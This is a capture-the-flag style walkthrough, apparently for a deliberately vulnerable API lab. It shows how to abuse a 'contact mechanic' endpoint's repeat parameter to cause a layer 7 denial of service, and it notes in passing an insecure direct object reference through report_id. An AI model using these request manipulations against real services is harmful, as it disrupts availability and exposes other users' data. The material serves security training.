# API4_2019_Lack_of_Resources_Rate_Limiting

The application does not impose any rate limits or restrictions on the number of requests. It allows attackers to abuse the available resources, leading them to exhaustion.

## Challenge 6 - Perform a layer 7 DoS using 'contact mechanic' feature

1. Login into your account;
2. Use the `contact mechanic` form and submit a request. Use the browser's inspector to intercept the API endpoint, the request, and the response payloads.
    The endpoint is `http://localhost:8888/workshop/api/merchant/contact_mechanic`.
    The response payload should be ***[bonus, you can change the `report_id` and access other users' data]***:

    ```json
    {
        "response_from_mechanic_api": {
            "id": 13,
            "sent": true,
            "report_link": "http://localhost:8888/workshop/api/mechanic/mechanic_report?report_id=13"
        },
        "status": 200
    }
    ```

    The `request` payload looks like the following:

    ```json
    {
        "mechanic_code": "TRAC_JME",
        "problem_details": "adasdsa",
        "vin": "1DRNT86VKBD275713",
        "mechanic_api": "http://localhost:8888/workshop/api/mechanic/receive_report",
        "repeat_request_if_failed": false,
        "number_of_repeats": 1
    }
    ```

3. Use Postman or curl to re-issue the request changing the payload to:

```json
{
    "mechanic_code": "TRAC_JME",
    "problem_details": "my car broke lose",
    "vin": "1DRNT86VKBD275713",
    "mechanic_api": "http://localhost:8888/workshop/api/mechanic/receive_report",
    "repeat_request_if_failed": true,
    "number_of_repeats": 1000000
}
```

The application will send 1 million requests to the mechanic API, leading to a DoS. It will reply:

```json
{
    "message": "Service unavailable. Seems like you caused layer 7 DoS :)"
}
```
